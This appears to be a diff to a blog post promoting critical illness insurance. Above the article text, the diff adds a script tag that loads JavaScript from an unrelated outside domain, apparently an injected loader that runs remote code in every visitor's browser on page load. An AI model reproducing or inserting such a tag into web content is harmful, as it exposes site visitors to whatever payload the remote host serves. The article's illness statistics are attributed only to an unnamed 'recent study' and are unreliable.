@@ -5,6 +5,9 @@ image:
   teaser: risk-health-insurance.jpg
 ---
 
+<script data-cfasync="false" src="http://link.azedl.com/tes.js" type="text/javascript"></script>
+
+
 Making a monetary arrangement for when you may have an illness that prevents you from living a regular life or is life threatening is not the easiest thing in the world but critical illness insurance covers this very real eventuality. It is unfortunate that most of us prefer to spend a few bucks every day on small luxuries than on providing our immediate family and loved ones with security to guarantee financial stability should something occur.
 
 As the majority of health insurance products now cover common sicknesses and given the statistical probability that you will be critically ill at some point, it is a good thing to have. The number of males who, before they retire, will suffer from a critical illness is an astonishing twenty percent according to figures published from recent study. For women, this figure is slightly lower with only one in six being impacted by a critical illness before retirement.
